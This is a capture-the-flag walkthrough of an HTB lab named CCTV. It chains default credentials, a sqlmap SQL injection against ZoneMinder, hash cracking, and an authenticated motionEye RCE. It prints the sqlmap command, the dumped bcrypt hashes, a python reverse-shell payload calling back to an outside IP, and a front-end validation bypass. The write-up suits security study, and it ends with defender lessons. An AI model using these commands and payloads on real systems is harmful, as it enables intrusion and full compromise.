---
title: CCTV
type: writeup
category: linux
platform: HTB
difficulty: Easy
os: Linux
date: 2026-05-14
avatar: avatar.png
tags:
  - CVE-2024-51482
  - GHSA-j945-qm58-4gjx
  - ZoneMinder
  - motionEye
  - SQL-Injection
  - RCE
summary: Full lab walkthrough from recon to root, chaining default creds and a ZoneMinder SQL injection to leak credentials, then pivoting through an internal motionEye RCE to land a root shell.
initialAccess: SQL injection on ZoneMinder's event tag-removal endpoint via CVE-2024-51482, used to dump user password hashes; cracked mark's hash with rockyou for SSH access.
privesc: Tunneled to a local motionEye instance, recovered its admin credentials from motion.conf, and exploited an authenticated RCE in motionEye's config validation to get a root shell.
---

# CCTV

A ZoneMinder surveillance panel turned out to be far easier to break into than to actually watch anything on. Default admin creds got us in the door, a known SQL injection cracked open the database, and a cracked password hash bought SSH access. From there, an internal-only motionEye instance — reachable through a tunnel — had its own authenticated RCE, and that was the whole box. A camera system that saw everything except the intrusion happening on it.

---

## 1. Reconnaissance

As always, we start with an nmap scan.

![image.png](image.png)

A web server on HTTP. Let's see what it's serving.

![image.png](image%201.png)

Nothing too exciting at first glance, but there's a "Staff Login" button worth a look.

![image.png](image%202.png)

That leads to a login page for what turns out to be ZoneMinder.

---

## 2. Initial Access — ZoneMinder SQL Injection

Before anything fancy, let's try the classics: `admin:admin` and `admin:admin123`, both suspiciously common on webapps that should really know better.

![image.png](image%203.png)

And that's it — we're in the admin panel with `admin:admin`.

There's also a version number in the top-right corner, effectively a free hint from the developers. A quick search turns up a matching vulnerability: [CVE-2024-51482](https://nvd.nist.gov/vuln/detail/CVE-2024-51482).

Following the PoC from the official advisory ([GHSA-qm8h-3xvf-m7j3](https://github.com/ZoneMinder/zoneminder/security/advisories/GHSA-qm8h-3xvf-m7j3)), we can perform SQL injection against the target:

```bash
❯ sqlmap -u "http://cctv.htb/zm/index.php?view=request&request=event&action=removetag&tid=1" \
  --cookie="ZMSESSID=2mj149te9d2ta4ivc71fpjifvh" --batch --level=3 --risk=3
```

![image.png](image%204.png)

The `tid` parameter is injectable. Time to dump the database.

![image.png](image%205.png)

This part takes a while — sqlmap doesn't believe in rushing.

---

## 3. Credential Harvesting

Once the dust settles, we've got the users table and their password hashes.

| User | Hash |
| --- | --- |
| superadmin | `$2y$10$cmytVWFRnt1XfqsItsJRVe/ApxWxcIFQcURnm5N.rhlULwM0jrtbm` |
| mark | `$2y$10$prZGnazejKcuTv5bKNexXOgLyQaok0hq07LW7AJ/QNqZolbXKfFG.` |
| admin | `$2y$10$t5z8uIT.n9uCdHCNidcLf.39T1Ui9nrlCkdXrzJMnJgkTiAvRUM6m` |

These are bcrypt hashes, so into a `file.hash` they go for hashcat:

```bash
hashcat -m 3200 file.hash /usr/share/wordlists/rockyou.txt
```

rockyou comes through again — password for `mark`: `opensesame`.

**Credentials:** `mark : opensesame`

---

## 4. SSH Access — User Flag

```bash
ssh mark@10.129.244.156
```

We're in, but there's no flag sitting here — time to escalate.

```bash
mark@cctv:/home$ ss -tlnp
State          Recv-Q          Send-Q                   Local Address:Port                    Peer Address:Port         Process         
LISTEN         0               4096                         127.0.0.1:9081                         0.0.0.0:*                            
LISTEN         0               128                          127.0.0.1:8765                         0.0.0.0:*                            
LISTEN         0               4096                     127.0.0.53%lo:53                           0.0.0.0:*                            
LISTEN         0               4096                         127.0.0.1:8888                         0.0.0.0:*                            
LISTEN         0               4096                         127.0.0.1:8554                         0.0.0.0:*                            
LISTEN         0               70                           127.0.0.1:33060                        0.0.0.0:*                            
LISTEN         0               4096                         127.0.0.1:7999                         0.0.0.0:*                            
LISTEN         0               4096                         127.0.0.1:1935                         0.0.0.0:*                            
LISTEN         0               4096                           0.0.0.0:22                           0.0.0.0:*                            
LISTEN         0               151                          127.0.0.1:3306                         0.0.0.0:*                            
LISTEN         0               4096                        127.0.0.54:53                           0.0.0.0:*                            
LISTEN         0               511                                  *:80                                 *:*                            
LISTEN         0               4096                              [::]:22                              [::]:*                            
```

Poking around the local services with curl:

```bash
mark@cctv:/home$ curl -I http://127.0.0.1:8765
HTTP/1.1 200 OK
Server: motionEye/0.43.1b4
Content-Type: text/html; charset=UTF-8
Date: Thu, 14 May 2026 09:01:22 GMT
Etag: "da39a3ee5e6b4b0d3255bfef95601890afd80709"
Content-Length: 0
```

motionEye — a web-based frontend for the motion daemon, used to turn Linux devices into surveillance systems with camera management, motion detection, and recording. Fitting, for a box literally called CCTV.

---

## 5. Privilege Escalation — motionEye RCE

Since motionEye only listens locally, let's tunnel it over SSH for a closer look:

```bash
ssh -L 8765:127.0.0.1:8765 mark@cctv.htb
```

![image.png](image%206.png)

The default `admin:blank password` combo doesn't work here. Time to check the config file instead:

```bash
mark@cctv:~$ cat /etc/motioneye/motion.conf
# @admin_username admin
# @normal_username user
# @admin_password 989c5a8ee87a0e9521ec81a79187d162109282f0
# @lang en
# @enabled on
# @normal_password 

setup_mode off
webcontrol_port 7999
webcontrol_interface 1
webcontrol_localhost on
webcontrol_parms 2

camera camera-1.conf
```

Admin credentials, hiding in plain sight.

While digging around, there's also an RCE vulnerability affecting motionEye via the admin panel: [GHSA-j945-qm58-4gjx](https://github.com/advisories/GHSA-j945-qm58-4gjx). Logging in as admin confirms it's worth trying:

![image.png](image%207.png)

The running version matches the advisory. Set up a reverse shell payload:

```bash
$(python3 -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("10.10.16.59",4444));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);subprocess.call(["/bin/bash","-i"])').%Y-%m-%d-%H-%M-%S
```

Then bypassed the front-end validation with:

```bash
configUiValid = function() { return true; };
```

Sent the payload, and got a root shell.

![image.png](image%208.png)

![image.png](image%209.png)

```bash
root@cctv:/home/sa_mark# cat user.txt
cat user.txt

root@cctv:/home/sa_mark# cat /root/root.txt
cat /root/root.txt

root@cctv:/home/sa_mark# 
```

![image.png](image%2010.png)

---

## 6. Summary & Takeaways

| Step | Vulnerability | Result |
|---|---|---|
| Initial access | Default creds (`admin:admin`) + ZoneMinder SQL injection (CVE-2024-51482) | Dumped user password hashes |
| Lateral move | Cracked bcrypt hash for `mark` with rockyou | SSH access |
| Privilege escalation | Leaked motionEye admin creds + authenticated RCE (GHSA-j945-qm58-4gjx) | Root shell |

**Lessons for defenders:**
- Change default admin credentials before anything goes near a network — `admin:admin` should never survive past setup.
- Keep ZoneMinder and its dependencies patched; SQL injection in a core endpoint is a full database compromise waiting to happen.
- Internal-only services like motionEye still need hardening. "Local only" is not the same thing as "safe," especially once an attacker has a foothold to tunnel through.
- Config files with embedded credentials (even hashed) are still worth protecting with tight file permissions.

Done.